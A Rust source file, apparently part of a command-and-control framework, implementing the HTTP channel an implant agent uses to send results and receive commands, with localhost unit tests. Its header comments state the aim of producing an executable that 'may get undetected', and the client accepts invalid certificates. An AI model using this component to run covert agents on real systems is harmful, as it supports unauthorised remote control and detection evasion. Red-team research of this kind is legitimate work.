//! The HTTP protocol module provides the implementation of the HTTP protocol for sending and
//! receiving data.
//!
//! This implementation uses the `reqwest` crate to send and receive data over HTTP. Meaning it
//! depends on STD.
//!
//! # Why is this implementation provided?
//! Even if depending on STD and bringing lots of useless dependencies (CRT we're looking at you
//! now), a fully featured library such `reqwest` may result in some kind of "safe-likely"
//! executable that may get undetected.
//!
//! # Does it really make sense to use this implementation?
//! Probably building it into the `no_std` binary is not the best idea ever as it will bring a lot
//! of dependencies that are not needed, increasing the binary size and reducing the overall control
//! into the agent behaviour.
//! But as we said previously, it may be useful to have a "safe-likely" executable that may get
//! undetected under certain circumstances.

use std::sync::Arc;

use kageshirei_communication_protocol::{error::Protocol as ProtocolError, Metadata, Protocol};
use reqwest::{Client, ClientBuilder, RequestBuilder, Response};

/// Define the HTTP protocol for sending and receiving data.
pub struct HttpProtocol {
    /// The HTTP client used to send requests. This is an instance of the reqwest crate.
    /// It is configured to accept invalid certificates, use a maximum of 2 idle connections per
    /// host, and have a timeout of 30 seconds.
    /// It's also forced to uses the rustls TLS backend.
    ///
    /// Initiating a client allows for the creation of keep-alive connections, which can be reused
    /// for multiple requests, reducing the overhead of establishing a new connection for each
    /// request and improving performance.
    client:   Client,
    /// The base URL for the protocol. This is the URL to which requests are sent.
    base_url: String,
}

// Safety: The HttpProtocol struct is safe to send between threads.
unsafe impl Send for HttpProtocol {}
// Safety: The HttpProtocol struct is safe to share between threads.
unsafe impl Sync for HttpProtocol {}

impl HttpProtocol {
    /// Create a new HTTP protocol.
    pub fn new(base_url: String) -> Self {
        Self {
            client: ClientBuilder::new()
                .danger_accept_invalid_certs(true)
                .pool_max_idle_per_host(2)
                .timeout(std::time::Duration::from_secs(30))
                .use_rustls_tls()
                .build()
                .unwrap(),
            base_url,
        }
    }

    /// Get the request URL.
    ///
    /// # Arguments
    ///
    /// * `metadata` - The metadata needed to build the request URL.
    ///
    /// # Returns
    ///
    /// The request URL.
    fn get_request_url(&self, metadata: &Option<Arc<Metadata>>) -> String {
        let mut url = self.base_url.clone();

        // Ensure the URL ends with a slash.
        if !url.ends_with('/') {
            url.push('/');
        }

        #[expect(
            clippy::pattern_type_mismatch,
            reason = "Cannot dereference nor explicitly match against reference"
        )]
        if let Some(meta) = metadata {
            // Append the path to the URL if it is provided.
            if let Some(ref path) = meta.path {
                url.push_str(path);
            }
        }

        url
    }

    /// Fill the request headers with the required metadata.
    ///
    /// # Arguments
    ///
    /// * `request` - The request builder to fill with headers.
    /// * `metadata` - The metadata to use to fill the headers.
    ///
    /// # Returns
    ///
    /// The request builder with the filled headers.
    fn fill_meta_headers(&self, mut request: RequestBuilder, metadata: &Option<Arc<Metadata>>) -> RequestBuilder {
        #[expect(
            clippy::pattern_type_mismatch,
            reason = "Cannot dereference nor explicitly match against reference"
        )]
        if let Some(meta) = metadata {
            // Add the request ID to the headers.
            // The request ID is a combination of the request ID and the agent ID. This is used by the server to
            // identify the request origin.
            request = request.header("X-Request-ID", format!("{}.{}", meta.request_id, meta.agent_id))
                // Add the command ID to the headers.
                // The command ID is used to identify the command that was sent.
                .header("X-Identifier", meta.command_id.clone())
        }

        request
    }

    /// Send a request and check the status code for success.
    ///
    /// # Arguments
    ///
    /// * `request` - The request builder to send.
    ///
    /// # Returns
    ///
    /// The response to the request.
    async fn status_checked_send(&self, request: RequestBuilder) -> Result<Response, ProtocolError> {
        let response = request
            .send()
            .await
            .map_err(|e| ProtocolError::SendingError(Some(e.to_string())))?;

        let status = response.status();
        if !status.is_success() {
            return Err(ProtocolError::SendingError(Some(format!(
                "Received status code: {}",
                status
            ))));
        }

        Ok(response)
    }

    /// Extract the body from a response.
    ///
    /// # Arguments
    ///
    /// * `response` - The response to extract the body from.
    ///
    /// # Returns
    ///
    /// The body of the response.
    async fn extract_body(&self, response: Response) -> Result<Vec<u8>, ProtocolError> {
        response
            .bytes()
            .await
            .map_err(|e| ProtocolError::ReceivingError(Some(e.to_string())))
            .map(|bytes| bytes.to_vec())
    }
}

impl Protocol for HttpProtocol {
    async fn send(&mut self, data: Vec<u8>, metadata: Option<Arc<Metadata>>) -> Result<Vec<u8>, ProtocolError> {
        let mut request = self
            .client
            .post(self.get_request_url(&metadata))
            .body(data)
            .header("Content-Type", "text/plain");

        request = self.fill_meta_headers(request, &metadata);

        let response = self.status_checked_send(request).await?;
        self.extract_body(response).await
    }

    async fn receive(&mut self, metadata: Option<Arc<Metadata>>) -> Result<Vec<u8>, ProtocolError> {
        let mut request = self.client.get(self.get_request_url(&metadata));

        request = self.fill_meta_headers(request, &metadata);

        let response = self.status_checked_send(request).await?;
        self.extract_body(response).await
    }
}

#[cfg(test)]
mod tests {
    use axum::{body::Bytes, http::HeaderMap, routing::get, Router};
    use serial_test::serial;
    use tokio::select;
    use tokio_util::sync::CancellationToken;

    use super::*;

    async fn make_dummy_server(cancellation_token: CancellationToken, router: Router<()>) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:8080")
            .await
            .unwrap();

        axum::serve(listener, router)
            .with_graceful_shutdown(async move {
                select! {
                    _ = cancellation_token.cancelled() => {},
                }
            })
            .await
            .unwrap();
    }

    #[axum::debug_handler]
    async fn handler_post(headers: HeaderMap, body: Bytes) -> String {
        assert_eq!(headers.get("content-type").unwrap(), "text/plain");
        assert_eq!(
            headers.get("X-Request-ID").unwrap(),
            "an3a8hlnrr4638d30yef0oz5sncjdx5v.an3a8hlnrr4638d30yef0oz5sncjdx5x"
        );
        assert_eq!(
            headers.get("X-Identifier").unwrap(),
            "an3a8hlnrr4638d30yef0oz5sncjdx5w"
        );
        assert_eq!(body.to_vec(), b"bar".to_vec());

        "Ok".to_owned()
    }

    #[axum::debug_handler]
    async fn handler_get(headers: HeaderMap) -> String {
        assert_eq!(
            headers.get("X-Request-ID").unwrap(),
            "an3a8hlnrr4638d30yef0oz5sncjdx5v.an3a8hlnrr4638d30yef0oz5sncjdx5x"
        );
        assert_eq!(
            headers.get("X-Identifier").unwrap(),
            "an3a8hlnrr4638d30yef0oz5sncjdx5w"
        );

        "Ok".to_owned()
    }

    #[tokio::test]
    #[serial]
    async fn test_send() {
        let cancellation_token = CancellationToken::new();

        let router = Router::new().route("/", get(handler_get).post(handler_post));

        let call = make_dummy_server(cancellation_token.clone(), router);
        let server_handle = tokio::spawn(async move {
            call.await;
        });

        let mut protocol = HttpProtocol::new("http://localhost:8080".to_string());

        let data = b"bar".to_vec();
        let result = protocol
            .send(
                data,
                Some(Arc::new(Metadata {
                    request_id: "an3a8hlnrr4638d30yef0oz5sncjdx5v".to_string(),
                    agent_id:   "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
                    command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
                    path:       None,
                })),
            )
            .await;

        let result = unsafe { result.unwrap_unchecked() };
        assert_eq!(result, b"Ok".to_vec());

        cancellation_token.cancel();
        server_handle.await.unwrap();
    }

    #[tokio::test]
    #[serial]
    async fn test_receive() {
        let cancellation_token = CancellationToken::new();

        let router = Router::new().route("/", get(handler_get).post(handler_post));

        let call = make_dummy_server(cancellation_token.clone(), router);
        let server_handle = tokio::spawn(async move {
            call.await;
        });

        let mut protocol = HttpProtocol::new("http://localhost:8080".to_string());

        let result = protocol
            .receive(Some(Arc::new(Metadata {
                request_id: "an3a8hlnrr4638d30yef0oz5sncjdx5v".to_string(),
                agent_id:   "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
                command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
                path:       None,
            })))
            .await;

        let result = unsafe { result.unwrap_unchecked() };
        assert_eq!(result, b"Ok".to_vec());

        cancellation_token.cancel();
        server_handle.await.unwrap();
    }
}
